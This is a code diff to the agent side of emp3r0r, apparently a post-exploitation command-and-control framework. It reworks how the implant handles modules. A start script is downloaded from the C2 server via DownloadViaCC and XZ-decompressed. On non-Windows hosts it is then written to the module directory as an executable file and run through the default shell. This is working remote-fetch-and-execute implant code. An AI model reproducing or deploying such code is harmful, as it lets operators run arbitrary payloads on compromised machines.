@@ -6,9 +6,11 @@ import (
 	"io"
 	"log"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"runtime"
 
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/mholt/archiver/v4"
@@ -19,6 +21,14 @@ func moduleHandler(modName, checksum string) (out string) {
 	tarball := filepath.Join(RuntimeConfig.AgentRoot, modName+".tar.xz")
 	modDir := filepath.Join(RuntimeConfig.AgentRoot, modName)
 	startScript := fmt.Sprintf("%s.%s", modName, getScriptExtension())
+
+	// cd to module dir
+	cwd, err := os.Getwd()
+	if err != nil {
+		return fmt.Sprintf("getwd: %v", err)
+	}
+	defer os.Chdir(cwd)
+	os.Chdir(modDir)
 
 	// in memory execution?
 	inMem := checksum == "in_mem"
@@ -33,7 +43,7 @@ func moduleHandler(modName, checksum string) (out string) {
 		}
 	}
 
-	out, err := runStartScript(startScript)
+	out, err = runStartScript(startScript, modDir)
 	if err != nil {
 		return fmt.Sprintf("running start script: %v: %s", err, out)
 	}
@@ -68,16 +78,6 @@ func extractAndRunModule(modDir, tarball string) error {
 		return fmt.Errorf("unarchive module tarball: %v", err)
 	}
 
-	pwd, err := os.Getwd()
-	if err != nil {
-		return fmt.Errorf("pwd: %v", err)
-	}
-	defer os.Chdir(pwd)
-
-	if err := os.Chdir(modDir); err != nil {
-		return fmt.Errorf("cd to module dir: %v", err)
-	}
-
 	return processModuleFiles(modDir)
 }
 
@@ -103,28 +103,52 @@ func processModuleFiles(modDir string) error {
 	return nil
 }
 
-func runStartScript(startScript string) (string, error) {
+func runStartScript(startScript, modDir string) (string, error) {
 	// Download the script payload
 	payload, err := DownloadViaCC(startScript, "")
 	if err != nil {
 		return "", fmt.Errorf("downloading %s: %w", startScript, err)
 	}
 
-	// Decompress the payload using Brotli
+	// Decompress the payload using XZ
 	decompressedPayload, err := decompressXZ(payload, startScript)
 	if err != nil {
 		return "", err
 	}
 
 	log.Printf("Running %s:\n%s...", startScript, decompressedPayload[:100])
-	return RunModuleScript(decompressedPayload)
+	if runtime.GOOS == "windows" {
+		return RunModuleScript(decompressedPayload)
+	}
+
+	// otherwise save the file and run it
+	cwd, err := os.Getwd()
+	if err != nil {
+		return "", fmt.Errorf("getwd: %v", err)
+	}
+	if cwd != modDir {
+		os.Chdir(modDir)
+		defer os.Chdir(cwd)
+	}
+	scriptPath := filepath.Join(modDir, startScript)
+	// write script to file
+	if err := os.WriteFile(scriptPath, decompressedPayload, 0o700); err != nil {
+		return "", fmt.Errorf("writing %s: %v", startScript, err)
+	}
+	cmd := exec.Command(emp3r0r_data.DefaultShell, scriptPath)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		err = fmt.Errorf("running %s: %v: %s", startScript, err, out)
+		return string(out), err
+	}
+	return string(out), nil
 }
 
 // decompressXZ handles decompression of a payload.
 func decompressXZ(payload []byte, source string) ([]byte, error) {
 	r := bytes.NewReader(payload)
 
-	// Wrap the reader with Brotli decompressor
+	// Wrap the reader with XZ decompressor
 	decompressor, err := archiver.Xz{}.OpenReader(r)
 	if err != nil {
 		return nil, fmt.Errorf("decompressing %s: %w", source, err)
